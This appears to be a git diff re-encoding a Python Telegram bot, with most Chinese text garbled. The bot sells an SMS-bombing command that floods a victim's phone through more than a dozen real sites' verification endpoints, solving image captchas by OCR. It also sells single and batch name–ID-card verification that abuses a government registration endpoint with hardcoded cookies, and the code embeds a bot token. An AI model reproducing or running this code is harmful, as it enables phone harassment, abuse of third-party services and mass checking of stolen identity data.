@@ -1,4 +1,4 @@
-# -*- coding: gbk -*-
+# -*- coding: utf-8 -*-
 import re
 import base64
 import asyncio
@@ -16,10 +16,9 @@ from PIL import Image
 from io import BytesIO
 from tempfile import NamedTemporaryFile
 
-
 API_TOKEN = "7418093343:AAHtR8qcmeEqknS0AeBYxmXv92CLsj6l4hw"
 bot = telebot.TeleBot(API_TOKEN)
-PHONE_REGEX = re.compile(r'^1[3-9]\d{9}$')  # ÓÃÓÚÑéÖ¤ÊÖ»úºÅ
+PHONE_REGEX = re.compile(r'^1[3-9]\d{9}$')  # ç”¨äºéªŒè¯æ‰‹æœºå·
 POINTS_FILE = "points_v2.json"
 EXCHANGE_CODES_FILE = "exchange_codes.txt"
 
@@ -40,24 +39,14 @@ def handle_start_command(message):
     user_id = message.from_user.id
     points = load_points()
 
-    # ¼ì²éÓÃ»§IDÊÇ·ñÔÚJSONÎÄ¼şÖĞ
+    # æ£€æŸ¥ç”¨æˆ·IDæ˜¯å¦åœ¨JSONæ–‡ä»¶ä¸­
     if str(user_id) not in points:
-        initialize_user(user_id)  # ³õÊ¼»¯ÓÃ»§Êı¾İ
-        bot.send_message(message.chat.id, "»¶Ó­ĞÂÓÃ»§£¡ÄúµÄÊı¾İÒÑ³õÊ¼»¯¡£")
+        # å¦‚æœä¸åœ¨ï¼Œåˆå§‹åŒ–ç”¨æˆ·æ•°æ®
+        initialize_user(user_id)
+        bot.send_message(message.chat.id, "æ¬¢è¿æ–°ç”¨æˆ·ï¼æ‚¨çš„æ•°æ®å·²åˆå§‹åŒ–ã€‚")
     else:
-        bot.send_message(message.chat.id, "»¶Ó­Ê¹ÓÃ¸Ã»úÆ÷ÈË£¡")
-
-    # Ìá¹©ÃüÁîÁĞ±í¹©ÓÃ»§¸´ÖÆ
-    commands_list = (
-        "³¤°²ÊäÈë¿òµ¯³öµÄ¿ì½İÖ¸Áî"
-        "Äú¿ÉÒÔÊ¹ÓÃÒÔÏÂÃüÁî£º\n"
-        "/hz - ¶ÌĞÅºäÕ¨      ¸ñÊ½£º/hz 18888888888\n"
-        "/2ys - ¶şÒªËØºËÑé   ¸ñÊ½: /2ys ĞÕÃû Éí·İÖ¤\n"
-        "/yspl - ÅúÁ¿ºËÑé\n"
-        "/my - ²é¿´ÎÒµÄĞÅÏ¢\n"
-        "/cz - ¶Ò»»»ı·Ö\n"
-    )
-    bot.send_message(message.chat.id, commands_list)
+        # å¦‚æœåœ¨ï¼Œå›å¤æ¬¢è¿ä¿¡æ¯
+        bot.send_message(message.chat.id, "æ¬¢è¿ä½¿ç”¨è¯¥æœºå™¨äººï¼")
 
 
 
@@ -68,19 +57,19 @@ def handle_start_command(message):
 
 
 #-----------------------------------------------------------------------------------------------------------------------------
-# ³õÊ¼»¯»ı·ÖÎÄ¼ş
+# åˆå§‹åŒ–ç§¯åˆ†æ–‡ä»¶
 if not os.path.exists(POINTS_FILE):
     with open(POINTS_FILE, "w") as f:
         json.dump({}, f)
-# ³õÊ¼»¯¶Ò»»ÂëÎÄ¼ş
+# åˆå§‹åŒ–å…‘æ¢ç æ–‡ä»¶
 if not os.path.exists(EXCHANGE_CODES_FILE):
     with open(EXCHANGE_CODES_FILE, "w") as f:
         f.write("")
-# ¼ÓÔØ»ı·ÖÊı¾İ
+# åŠ è½½ç§¯åˆ†æ•°æ®
 def load_points():
     with open(POINTS_FILE, "r") as f:
         return json.load(f)
-# ±£´æ»ı·ÖÊı¾İ
+# ä¿å­˜ç§¯åˆ†æ•°æ®
 def save_points(points):
     with open(POINTS_FILE, "w") as f:
         json.dump(points, f)
@@ -96,28 +85,16 @@ def save_points(points):
 
 
 
-# ³õÊ¼»¯»ı·ÖÎÄ¼ş
-if not os.path.exists(POINTS_FILE):
-    with open(POINTS_FILE, "w") as f:
-        json.dump({}, f)
 
-# ³õÊ¼»¯ÓÃ»§Êı¾İ
+# åˆå§‹åŒ–ç”¨æˆ·æ•°æ®
 def initialize_user(user_id):
     points = load_points()
     if str(user_id) not in points:
-        points[str(user_id)] = {"current_points": 0, "total_spent": 0, "membership": "ÆÕÍ¨ÓÃ»§"}
-    elif isinstance(points[str(user_id)], int):  # Èç¹ûÓÃ»§Êı¾İÊÇÕûÊı£¬ĞŞ¸´Îª×Öµä
-        points[str(user_id)] = {"current_points": points[str(user_id)], "total_spent": 0, "membership": "ÆÕÍ¨ÓÃ»§"}
+        points[str(user_id)] = {"current_points": 0, "total_spent": 0, "membership": "æ™®é€šç”¨æˆ·"}
+    elif isinstance(points[str(user_id)], int):  # å¦‚æœç”¨æˆ·æ•°æ®æ˜¯æ•´æ•°ï¼Œä¿®å¤ä¸ºå­—å…¸
+        points[str(user_id)] = {"current_points": points[str(user_id)], "total_spent": 0, "membership": "æ™®é€šç”¨æˆ·"}
     save_points(points)
-# ¼ÓÔØ»ı·ÖÊı¾İ
-def load_points():
-    with open(POINTS_FILE, "r") as f:
-        return json.load(f)
 
-# ±£´æ»ı·ÖÊı¾İ
-def save_points(points):
-    with open(POINTS_FILE, "w") as f:
-        json.dump(points, f, ensure_ascii=False, indent=4)
 
 
 
@@ -136,21 +113,21 @@ def save_points(points):
 
 #-----------------------------------------------------------------------------------------------------------------------------
 
-# ¸üĞÂ»áÔ±¶ÎÎ»
+# æ›´æ–°ä¼šå‘˜æ®µä½
 def update_membership(user_id, total_spent):
     if total_spent >= 2000:
-        return "ÖÁ×ğÓÃ»§"
+        return "è‡³å°Šç”¨æˆ·"
     elif total_spent >= 500:
-        return "×êÊ¯ÓÃ»§"
+        return "é’»çŸ³ç”¨æˆ·"
     elif total_spent >= 200:
-        return "»Æ½ğÓÃ»§"
+        return "é»„é‡‘ç”¨æˆ·"
     else:
-        return "ÆÕÍ¨ÓÃ»§"
+        return "æ™®é€šç”¨æˆ·"
 
-# ¿Û³ı»ı·Ö²¢¸üĞÂÓÃ»§Êı¾İ
+# æ‰£é™¤ç§¯åˆ†å¹¶æ›´æ–°ç”¨æˆ·æ•°æ®
 def deduct_points(user_id, amount):
     points = load_points()
-    initialize_user(user_id)  # È·±£ÓÃ»§Êı¾İ³õÊ¼»¯
+    initialize_user(user_id)  # ç¡®ä¿ç”¨æˆ·æ•°æ®åˆå§‹åŒ–
     user_data = points[str(user_id)]
     user_data["current_points"] -= amount
     user_data["total_spent"] += amount
@@ -166,7 +143,7 @@ def deduct_points(user_id, amount):
 #-----------------------------------------------------------------------------------------------------------------------------
 
 
-# Ä£Äâ¶ÌĞÅºäÕ¨
+# æ¨¡æ‹ŸçŸ­ä¿¡è½°ç‚¸
 async def sms_bomb(phone_number):
     tasks = [
         hz1(phone_number),
@@ -204,71 +181,84 @@ async def sms_bomb(phone_number):
 
 #-----------------------------------------------------------------------------------------------------------------------------
 
-# ´¦Àí /hz ÃüÁî
+# å¤„ç† /hz å‘½ä»¤
 @bot.message_handler(commands=['hz'])
 def handle_hz_command(message):
     user_id = message.from_user.id
     points = load_points()
-    initialize_user(user_id)  # È·±£ÓÃ»§Êı¾İ³õÊ¼»¯
-    user_data = points[str(user_id)]
-    if user_data["current_points"] < 10:
-        bot.send_message(message.chat.id, "»ı·Ö²»×ã£¬ÎŞ·¨½øĞĞ¶ÌĞÅºäÕ¨¡£")
-        return
-
-    phone_number = message.text.split()[1] if len(message.text.split()) > 1 else None
-    if phone_number and PHONE_REGEX.match(phone_number):
-        try:
-            asyncio.run(sms_bomb(phone_number))
-            bot.reply_to(message, "¶ÌĞÅºäÕ¨ÒÑÆô¶¯£¡")
-            deduct_points(user_id, 10)  # ¿Û³ı»ı·Ö²¢¸üĞÂÓÃ»§Êı¾İ
-        except Exception as e:
-            bot.reply_to(message, f"¶ÌĞÅºäÕ¨Ê§°Ü£º{str(e)}")
+    if str(user_id) not in points:
+        # å¦‚æœä¸åœ¨ï¼Œåˆå§‹åŒ–ç”¨æˆ·æ•°æ®
+        initialize_user(user_id)
+        bot.send_message(message.chat.id, "æ¬¢è¿æ–°ç”¨æˆ·ï¼æ‚¨çš„æ•°æ®å·²åˆå§‹åŒ–ã€‚")
     else:
-        bot.reply_to(message, "ÎŞĞ§µÄÊÖ»úºÅ£¬ÇëÖØĞÂÊäÈë¡£")
+        # å¦‚æœåœ¨ï¼Œå›å¤æ¬¢è¿ä¿¡æ¯
+        bot.send_message(message.chat.id, "æ¬¢è¿ä½¿ç”¨è¯¥æœºå™¨äººï¼")
+        initialize_user(user_id)  # ç¡®ä¿ç”¨æˆ·æ•°æ®åˆå§‹åŒ–
+        user_data = points[str(user_id)]
+        if user_data["current_points"] < 10:
+            bot.send_message(message.chat.id, "ç§¯åˆ†ä¸è¶³ï¼Œæ— æ³•è¿›è¡ŒçŸ­ä¿¡è½°ç‚¸ã€‚")
+            return
+
+        phone_number = message.text.split()[1] if len(message.text.split()) > 1 else None
+        if phone_number and PHONE_REGEX.match(phone_number):
+            try:
+                asyncio.run(sms_bomb(phone_number))
+                bot.reply_to(message, "çŸ­ä¿¡è½°ç‚¸å·²å¯åŠ¨ï¼")
+                deduct_points(user_id, 10)  # æ‰£é™¤ç§¯åˆ†å¹¶æ›´æ–°ç”¨æˆ·æ•°æ®
+            except Exception as e:
+                bot.reply_to(message, f"çŸ­ä¿¡è½°ç‚¸å¤±è´¥ï¼š{str(e)}")
+        else:
+            bot.reply_to(message, "æ— æ•ˆçš„æ‰‹æœºå·ï¼Œè¯·é‡æ–°è¾“å…¥ã€‚")
 
 
 
-# ´¦Àí /2ys ÃüÁî
+# å¤„ç† /2ys å‘½ä»¤
 @bot.message_handler(commands=['2ys'])
 def handle_2ys_command(message):
     user_id = message.from_user.id
     points = load_points()
-    if points.get(str(user_id), 0) < 15:
-        bot.send_message(message.chat.id, "»ı·Ö²»×ã£¬ÎŞ·¨½øĞĞ¶şÒªËØºËÑé¡£")
-        return
+    if str(user_id) not in points:
+        initialize_user(user_id)  # åˆå§‹åŒ–ç”¨æˆ·æ•°æ®
+    else:
+        user_data = points[str(user_id)]
+        if user_data.get("current_points", 0) < 15:  # ä»å­—å…¸ä¸­è·å–ç§¯åˆ†å¹¶è¿›è¡Œæ¯”è¾ƒ
+            bot.send_message(message.chat.id, "ç§¯åˆ†ä¸è¶³ï¼Œæ— æ³•è¿›è¡ŒäºŒè¦ç´ æ ¸éªŒã€‚")
+            return
 
-    bot.send_message(message.chat.id, "ÇëÊäÈëĞÕÃûºÍÉí·İÖ¤ºÅ£¨¸ñÊ½£ºĞÕÃû Éí·İÖ¤ºÅ£©£º")
+    bot.send_message(message.chat.id, "è¯·è¾“å…¥å§“åå’Œèº«ä»½è¯å·ï¼ˆæ ¼å¼ï¼šå§“å èº«ä»½è¯å·ï¼‰ï¼š")
     user_state[message.from_user.id] = '2ys_input'
 
-
-# ´¦Àí¶şÒªËØºËÑéÊäÈë
+# å¤„ç†äºŒè¦ç´ æ ¸éªŒè¾“å…¥
 @bot.message_handler(content_types=['text'], func=lambda message: user_state.get(message.from_user.id) == '2ys_input')
 def handle_2ys_input(message):
     try:
         user_id = message.from_user.id
         name, id_card = message.text.split()
         result = main(name, id_card)
-        bot.reply_to(message, f"ºËÑé½á¹û£º{result}")
-        deduct_points(user_id, 15)  # ¿Û³ı»ı·Ö²¢¸üĞÂÓÃ»§Êı¾İ
+        bot.reply_to(message, f"æ ¸éªŒç»“æœï¼š{result}")
+        deduct_points(user_id, 15)  # æ‰£é™¤ç§¯åˆ†å¹¶æ›´æ–°ç”¨æˆ·æ•°æ®
     except ValueError:
-        bot.reply_to(message, "ÊäÈë¸ñÊ½´íÎó£¬Çë°´ÕıÈ·¸ñÊ½ÊäÈë£ºĞÕÃû Éí·İÖ¤ºÅ")
+        bot.reply_to(message, "è¾“å…¥æ ¼å¼é”™è¯¯ï¼Œè¯·æŒ‰æ­£ç¡®æ ¼å¼è¾“å…¥ï¼šå§“å èº«ä»½è¯å·")
     except Exception as e:
-        bot.reply_to(message, f"ºËÑéÊ§°Ü£º{str(e)}")
+        bot.reply_to(message, f"æ ¸éªŒå¤±è´¥ï¼š{str(e)}")
     finally:
         if user_id in user_state:
             del user_state[user_id]
 
 
-# ´¦Àí /yspl ÃüÁî
+# å¤„ç† /yspl å‘½ä»¤
 @bot.message_handler(commands=['yspl'])
 def handle_yspl_command(message):
     user_id = message.from_user.id
     points = load_points()
-    if points.get(str(user_id), 0) < 45:
-        bot.send_message(message.chat.id, "»ı·Ö²»×ã£¬ÎŞ·¨½øĞĞÅúÁ¿ºËÑé¡£")
+    initialize_user(user_id)  # ç¡®ä¿ç”¨æˆ·æ•°æ®åˆå§‹åŒ–
+    user_data = points.get(str(user_id), {"current_points": 0})  # ä½¿ç”¨ get æ–¹æ³•å®‰å…¨åœ°è·å–ç”¨æˆ·æ•°æ®
+
+    if user_data["current_points"] < 45:
+        bot.send_message(message.chat.id, "ç§¯åˆ†ä¸è¶³ï¼Œæ— æ³•è¿›è¡Œæ‰¹é‡æ ¸éªŒã€‚")
         return
 
-    bot.send_message(message.chat.id, "ÇëÉÏ´«°üº¬Éí·İĞÅÏ¢µÄtxtÎÄ¼ş£¨Ã¿ĞĞÒ»¸öĞÕÃûºÍÉí·İÖ¤ºÅ£©£º")
+    bot.send_message(message.chat.id, "è¯·ä¸Šä¼ åŒ…å«èº«ä»½ä¿¡æ¯çš„txtæ–‡ä»¶ï¼ˆæ¯è¡Œä¸€ä¸ªå§“åå’Œèº«ä»½è¯å·ï¼‰ï¼š")
     user_state[message.from_user.id] = 'yspl_file'
 
 
@@ -283,39 +273,39 @@ def handle_batch_check_file(message):
         response.raise_for_status()
         file_content = response.content.decode('gbk', errors='replace')
         lines = file_content.strip().split("\n")
-        results = {"³É¹¦": [], "Ê§°Ü": []}
+        results = {"æˆåŠŸ": [], "å¤±è´¥": []}
 
         for line in lines:
             info_list = line.split()
             if len(info_list) == 2:
                 name, id_card = info_list
                 hycodecc2 = main(name, id_card)
-                if "Ğ£Ñé³É¹¦" in hycodecc2:
-                    results["³É¹¦"].append(f"{name} {id_card}: {hycodecc2}")
+                if "æ ¡éªŒæˆåŠŸ" in hycodecc2:
+                    results["æˆåŠŸ"].append(f"{name} {id_card}: {hycodecc2}")
                 else:
-                    results["Ê§°Ü"].append(f"{name} {id_card}: {hycodecc2}")
+                    results["å¤±è´¥"].append(f"{name} {id_card}: {hycodecc2}")
             else:
-                results["Ê§°Ü"].append(f"¸ñÊ½´íÎó: {line}")
+                results["å¤±è´¥"].append(f"æ ¼å¼é”™è¯¯: {line}")
 
         with NamedTemporaryFile(delete=False, mode='w', suffix='.txt', encoding='utf-8') as temp_file:
-            temp_file.write("ºËÑé½á¹û\n")
+            temp_file.write("æ ¸éªŒç»“æœ\n")
             temp_file.write("------------\n")
-            temp_file.write("³É¹¦:\n")
-            temp_file.write("\n".join(results["³É¹¦"]))
-            temp_file.write("\n\nÊ§°Ü:\n")
-            temp_file.write("\n".join(results["Ê§°Ü"]))
+            temp_file.write("æˆåŠŸ:\n")
+            temp_file.write("\n".join(results["æˆåŠŸ"]))
+            temp_file.write("\n\nå¤±è´¥:\n")
+            temp_file.write("\n".join(results["å¤±è´¥"]))
             temp_file_path = temp_file.name
 
         with open(temp_file_path, 'rb') as file:
-            bot.send_document(message.chat.id, file, caption="ºËÑé½á¹ûÎÄ¼ş")
+            bot.send_document(message.chat.id, file, caption="æ ¸éªŒç»“æœæ–‡ä»¶")
 
         os.remove(temp_file_path)
-        deduct_points(user_id, 45)  # ¿Û³ı»ı·Ö²¢¸üĞÂÓÃ»§Êı¾İ
+        deduct_points(user_id, 45)  # æ‰£é™¤ç§¯åˆ†å¹¶æ›´æ–°ç”¨æˆ·æ•°æ®
 
     except requests.exceptions.RequestException as e:
-        bot.reply_to(message, f"ÏÂÔØÎÄ¼şÊ±³ö´í£º{str(e)}¡£Çë¼ì²éÎÄ¼şÁ´½ÓµÄºÏ·¨ĞÔ£¬²¢ÊÊµ±ÖØÊÔ¡£")
+        bot.reply_to(message, f"ä¸‹è½½æ–‡ä»¶æ—¶å‡ºé”™ï¼š{str(e)}ã€‚è¯·æ£€æŸ¥æ–‡ä»¶é“¾æ¥çš„åˆæ³•æ€§ï¼Œå¹¶é€‚å½“é‡è¯•ã€‚")
     except Exception as e:
-        bot.reply_to(message, f"´¦ÀíÎÄ¼şÊ±³ö´í£º{str(e)}¡£")
+        bot.reply_to(message, f"å¤„ç†æ–‡ä»¶æ—¶å‡ºé”™ï¼š{str(e)}ã€‚")
     finally:
         if user_id in user_state:
             del user_state[user_id]
@@ -339,54 +329,70 @@ def handle_batch_check_file(message):
 def handle_my_command(message):
     user_id = message.from_user.id
     points = load_points()
-    initialize_user(user_id)  # È·±£ÓÃ»§Êı¾İ³õÊ¼»¯
-    user_data = points[str(user_id)]
+    if str(user_id) not in points:
+        # å¦‚æœä¸åœ¨ï¼Œåˆå§‹åŒ–ç”¨æˆ·æ•°æ®
+        initialize_user(user_id)
+        bot.send_message(message.chat.id, "æ¬¢è¿æ–°ç”¨æˆ·ï¼æ‚¨çš„æ•°æ®å·²åˆå§‹åŒ–ã€‚")
+    else:
+        # å¦‚æœåœ¨ï¼Œå›å¤æ¬¢è¿ä¿¡æ¯
+        bot.send_message(message.chat.id, "æ¬¢è¿ä½¿ç”¨è¯¥æœºå™¨äººï¼")
+        initialize_user(user_id)  # ç¡®ä¿ç”¨æˆ·æ•°æ®åˆå§‹åŒ–
+        user_data = points[str(user_id)]
 
-    if not isinstance(user_data, dict):  # Èç¹û user_data ²»ÊÇ×Öµä£¬ĞŞ¸´Ëü
-        user_data = {"current_points": user_data, "total_spent": 0, "membership": "ÆÕÍ¨ÓÃ»§"}
-        points[str(user_id)] = user_data
-        save_points(points)
+        if not isinstance(user_data, dict):  # å¦‚æœ user_data ä¸æ˜¯å­—å…¸ï¼Œä¿®å¤å®ƒ
+            user_data = {"current_points": user_data, "total_spent": 0, "membership": "æ™®é€šç”¨æˆ·"}
+            points[str(user_id)] = user_data
+            save_points(points)
 
-    current_points = user_data.get("current_points", 0)
-    total_spent = user_data.get("total_spent", 0)
-    membership = user_data.get("membership", "ÆÕÍ¨ÓÃ»§")
+        current_points = user_data.get("current_points", 0)
+        total_spent = user_data.get("total_spent", 0)
+        membership = user_data.get("membership", "æ™®é€šç”¨æˆ·")
 
-    bot.send_message(message.chat.id, f"¸öÈËÖĞĞÄ\n"
-                                      f"ÓÃ»§ ID: {user_id}\n"
-                                      f"µ±Ç°»ı·Ö: {current_points}·Ö\n"
-                                      f"ÀúÊ·ÏûºÄ»ı·Ö: {total_spent}·Ö\n"
-                                      f"»áÔ±¶ÎÎ»: {membership}")
+        bot.send_message(message.chat.id, f"ä¸ªäººä¸­å¿ƒ\n"
+                                          f"ç”¨æˆ· ID: {user_id}\n"
+                                          f"å½“å‰ç§¯åˆ†: {current_points}åˆ†\n"
+                                          f"å†å²æ¶ˆè€—ç§¯åˆ†: {total_spent}åˆ†\n"
+                                          f"ä¼šå‘˜æ®µä½: {membership}")
 
-# ´¦Àí /cz ÃüÁî
+# å¤„ç† /cz å‘½ä»¤
 @bot.message_handler(commands=['cz'])
 def handle_cz_command(message):
-    bot.send_message(message.chat.id, "ÇëÊäÈë¶Ò»»Âë£º")
-    user_state[message.from_user.id] = 'exchange_code'
+    user_id = message.from_user.id
+    points = load_points()
+    if str(user_id) not in points:
+        # å¦‚æœä¸åœ¨ï¼Œåˆå§‹åŒ–ç”¨æˆ·æ•°æ®
+        initialize_user(user_id)
+        bot.send_message(message.chat.id, "æ¬¢è¿æ–°ç”¨æˆ·ï¼æ‚¨çš„æ•°æ®å·²åˆå§‹åŒ–ã€‚")
+    else:
+        # å¦‚æœåœ¨ï¼Œå›å¤æ¬¢è¿ä¿¡æ¯
+        bot.send_message(message.chat.id, "æ¬¢è¿ä½¿ç”¨è¯¥æœºå™¨äººï¼")
+        bot.send_message(message.chat.id, "è¯·è¾“å…¥å…‘æ¢ç ï¼š")
+        user_state[message.from_user.id] = 'exchange_code'
 
-# ´¦ÀíÓÃ»§ÊäÈë¶Ò»»Âë
+# å¤„ç†ç”¨æˆ·è¾“å…¥å…‘æ¢ç 
 @bot.message_handler(content_types=['text'], func=lambda message: user_state.get(message.from_user.id) == 'exchange_code')
 def handle_exchange_code(message):
     user_id = message.from_user.id
     exchange_code = message.text
     points = load_points()
-    initialize_user(user_id)  # È·±£ÓÃ»§Êı¾İ³õÊ¼»¯
+    initialize_user(user_id)  # ç¡®ä¿ç”¨æˆ·æ•°æ®åˆå§‹åŒ–
 
     with open(EXCHANGE_CODES_FILE, "r") as f:
         codes = f.read().splitlines()
 
     if exchange_code in codes:
-        # ¸üĞÂÓÃ»§»ı·Ö
+        # æ›´æ–°ç”¨æˆ·ç§¯åˆ†
         points[str(user_id)]["current_points"] += 50
         save_points(points)
 
-        # ´Ó¶Ò»»ÂëÎÄ¼şÖĞÒÆ³ıÒÑÊ¹ÓÃµÄ¶Ò»»Âë
+        # ä»å…‘æ¢ç æ–‡ä»¶ä¸­ç§»é™¤å·²ä½¿ç”¨çš„å…‘æ¢ç 
         codes.remove(exchange_code)
         with open(EXCHANGE_CODES_FILE, "w") as f:
             f.write("\n".join(codes))
 
-        bot.reply_to(message, "¶Ò»»³É¹¦£¬ÒÑÔö¼Ó 50 »ı·Ö¡£")
+        bot.reply_to(message, "å…‘æ¢æˆåŠŸï¼Œå·²å¢åŠ  50 ç§¯åˆ†ã€‚")
     else:
-        bot.reply_to(message, "¶Ò»»ÂëÎŞĞ§£¬ÇëÖØÊÔ¡£")
+        bot.reply_to(message, "å…‘æ¢ç æ— æ•ˆï¼Œè¯·é‡è¯•ã€‚")
 
     del user_state[user_id]
 #-----------------------------------------------------------------------------------------------------------------------------
@@ -458,7 +464,7 @@ async def hz2(phone_number):
             result = await response.text()
             print('hz2', result)
 
-# Òì²½°æ±¾µÄ hz3
+# å¼‚æ­¥ç‰ˆæœ¬çš„ hz3
 async def hz3(phone_number):
     url = "https://api.xfb315.com/auth/send_sms"
     headers = {
@@ -487,7 +493,7 @@ async def hz3(phone_number):
             result = await response.text()
             print('hz3', result)
 
-# Òì²½°æ±¾µÄ hz4
+# å¼‚æ­¥ç‰ˆæœ¬çš„ hz4
 async def hz4(phone_number):
     url = "https://xmind.cn/_res/user/signup_with_phone"
     cookies = {
@@ -524,7 +530,7 @@ async def hz4(phone_number):
             result = await response.text()
             print('hz4', result)
 
-# Òì²½°æ±¾µÄ hz5
+# å¼‚æ­¥ç‰ˆæœ¬çš„ hz5
 async def hz5(phone_number):
     url = "https://openapi.yishi-tong.com/account_system/open/sms/sendRegisterAccountSmsCode"
     headers = {
@@ -580,7 +586,7 @@ async def hz6(phone_number):
             result = await response.text()
             print('hz6', result)
 
-# Òì²½°æ±¾µÄ hz7
+# å¼‚æ­¥ç‰ˆæœ¬çš„ hz7
 async def hz7(phone_number):
     url_imgcaptcha = "https://lelink.lenovo.com.cn/v1/user/register/imgcaptcha"
     url_mobile_captcha = "https://lelink.lenovo.com.cn/v1/user/register/mobile/captcha/"
@@ -607,7 +613,7 @@ async def hz7(phone_number):
             image = Image.open(BytesIO(image_data))
             ocr = ddddocr.DdddOcr()
             result = ocr.classification(image)
-            print('ÑéÖ¤ÂëÊ¶±ğ½á¹û:', result)
+            print('éªŒè¯ç è¯†åˆ«ç»“æœ:', result)
 
         headers_2 = {
             'accept': '*/*',
@@ -632,7 +638,7 @@ async def hz7(phone_number):
             result = await response.text()
             print('hz7', result)
 
-# Òì²½°æ±¾µÄ hz8
+# å¼‚æ­¥ç‰ˆæœ¬çš„ hz8
 async def hz8(phone_number):
     url = "https://www.kuaijiexi.com/sendPhoneMessage"
     cookies = {
@@ -669,7 +675,7 @@ async def hz8(phone_number):
             result = await response.text()
             print('hz8', result)
 
-# Òì²½°æ±¾µÄ hz9
+# å¼‚æ­¥ç‰ˆæœ¬çš„ hz9
 async def hz9(phone_number):
     url_get_captcha = "https://user.ifeng.com/api/v1/get/captcha"
     url_send_sms = "https://user.ifeng.com/api/v1/sendsms"
@@ -703,7 +709,7 @@ async def hz9(phone_number):
             image = Image.open(BytesIO(image_data))
             ocr = ddddocr.DdddOcr()
             result = ocr.classification(image)
-            print('ÑéÖ¤ÂëÊ¶±ğ½á¹û:', result)
+            print('éªŒè¯ç è¯†åˆ«ç»“æœ:', result)
 
         id = response_json['id']
         headers_post = {
@@ -774,7 +780,7 @@ async def hz10(phone_number):
             result = await response.text()
             print('hz10', result)
 
-# Òì²½°æ±¾µÄ hz11
+# å¼‚æ­¥ç‰ˆæœ¬çš„ hz11
 async def hz11(phone_number):
     url = "https://passport.ks5u.com/RPAjax.ashx"
     cookies = {
@@ -808,7 +814,7 @@ async def hz11(phone_number):
             result = await response.text()
             print('hz11', result)
 
-# Òì²½°æ±¾µÄ hz12
+# å¼‚æ­¥ç‰ˆæœ¬çš„ hz12
 async def hz13(phone_number):
     url = "https://passport.jumpw.com/UserManager.do"
     cookies = {
@@ -846,7 +852,7 @@ async def hz13(phone_number):
             response_text = await response.text()
             print("hz13:", response_text)
 
-# Òì²½°æ±¾µÄ hz14
+# å¼‚æ­¥ç‰ˆæœ¬çš„ hz14
 async def hz14(phone_number):
     url = "https://sso.people.com.cn/u/reg/sendPhoneCode2"
     cookies = {
@@ -874,14 +880,14 @@ async def hz14(phone_number):
     }
     data = {
         'phoneNum': phone_number,
-        'verCode': '´ó¿Ú',
+        'verCode': 'å¤§å£',
     }
     async with aiohttp.ClientSession(cookies=cookies) as session:
         async with session.post(url, headers=headers, data=data) as response:
             result = await response.text()
             print('hz14', result)
 
-# Òì²½°æ±¾µÄ hz15
+# å¼‚æ­¥ç‰ˆæœ¬çš„ hz15
 async def hz15(phone_number):
     url_yzm = "https://www.yihu.com/Public/verityEntry"
     url_send_code = "https://www.yihu.com/Register/sendRegPhoneCode.shtml"
@@ -925,7 +931,7 @@ async def hz15(phone_number):
             image = Image.open(BytesIO(image_data))
             ocr = ddddocr.DdddOcr()
             result = ocr.classification(image)
-            print('ÑéÖ¤ÂëÊ¶±ğ½á¹û:', result)
+            print('éªŒè¯ç è¯†åˆ«ç»“æœ:', result)
 
         headers = {
             'Accept': '*/*',
@@ -953,7 +959,7 @@ async def hz15(phone_number):
             result = await response.text()
             print('hz15', result)
 
-# Òì²½°æ±¾µÄ hz16
+# å¼‚æ­¥ç‰ˆæœ¬çš„ hz16
 async def hz16(phone_number):
     url = "https://account.uibot.com.cn/api/v2/register/code/send"
     cookies = {
@@ -992,7 +998,7 @@ async def hz17(phone_number):
         'Accept': '*/*',
         'Accept-Language': 'zh-CN,zh;q=0.9',
         'App-Version': '2.2.4',
-        'Authorization': '111',  # Ìæ»»ÎªÓĞĞ§µÄÊÚÈ¨ÁîÅÆ
+        'Authorization': '111',  # æ›¿æ¢ä¸ºæœ‰æ•ˆçš„æˆæƒä»¤ç‰Œ
         'Connection': 'keep-alive',
         'Content-Type': 'application/json; charset=UTF-8',
         'Referer': 'https://servicewechat.com/wx5e1817bd2ac2f220/132/page-frame.html',
@@ -1010,7 +1016,7 @@ async def hz17(phone_number):
 
     async with aiohttp.ClientSession() as session:
         async with session.post(url, headers=headers, json=json_data) as response:
-            result = await response.json()  # Ö±½Ó½âÎöÎª JSON
+            result = await response.json()  # ç›´æ¥è§£æä¸º JSON
             print(result)
 
 #-----------------------------------------------------------------------------------------------------------------------------
@@ -1036,14 +1042,14 @@ def generate_uuid():
     return str(uuid_module.uuid4())
 def kkey(name, sfz):
     if not all([name, sfz]):
-        raise ValueError("ËùÓĞÊäÈë²»ÄÜÎª¿Õ")
+        raise ValueError("æ‰€æœ‰è¾“å…¥ä¸èƒ½ä¸ºç©º")
 
-    # ÑéÖ¤Éí·İÖ¤ºÅ¸ñÊ½
+    # éªŒè¯èº«ä»½è¯å·æ ¼å¼
     if len(sfz) != 18 or not sfz[:-1].isdigit() or not sfz[-1].isalnum():
-        raise ValueError("ÎŞĞ§µÄÉí·İÖ¤ºÅ")
+        raise ValueError("æ— æ•ˆçš„èº«ä»½è¯å·")
 
     l = '[{"id":"_common_hidden_viewdata","type":"hidden","value":{"pageUrl":"f537e54292b4a8629af13c01a5c7834aac203632e75b1a92a4425904942727f497170de81510129fa795cfc172873b04"}}]'
-    e = f'{{"cardtype":"01","displayname":"{name}","englishname":"","cardnum":"{sfz}","country":"","txznum":"","cardstartdate":"2024-01-01T00:00:00","cardenddate":"2034-01-11T00:00:00","idcard-year":"01","sex":"Å®","loginid":"{sfz}","mobile":"18366761008","userreallvl":"RC03","vcode":"121211","password":"11112222qQ","passwordqr":"11112222qQ"}}'
+    e = f'{{"cardtype":"01","displayname":"{name}","englishname":"","cardnum":"{sfz}","country":"","txznum":"","cardstartdate":"2024-01-01T00:00:00","cardenddate":"2034-01-11T00:00:00","idcard-year":"01","sex":"å¥³","loginid":"{sfz}","mobile":"18366761008","userreallvl":"RC03","vcode":"121211","password":"11112222qQ","passwordqr":"11112222qQ"}}'
 
     o = generate_uuid()
     rr = int(time.time() * 1000)
@@ -1064,7 +1070,7 @@ def main(name, sfz):
     try:
         BASE_URL = 'https://zwfwzjb.mohurd.gov.cn/zjb-tysf-qy/rest/registerbyguobanaction/smAuthP'
         PARAMS = {'isCommondto': 'true'}
-        # Ãô¸ĞĞÅÏ¢´Ó»·¾³±äÁ¿ÖĞ¶ÁÈ¡
+        # æ•æ„Ÿä¿¡æ¯ä»ç¯å¢ƒå˜é‡ä¸­è¯»å–
         COOKIES = {
             '_CSRFCOOKIE': 'C79D7E86A32271168CF4CB02FA2848B8087167E6',
             'EPTOKEN': 'C79D7E86A32271168CF4CB02FA2848B8087167E6',
@@ -1114,20 +1120,20 @@ def main(name, sfz):
         ).json()
 
         status_code = response.get('custom', {}).get('msg')
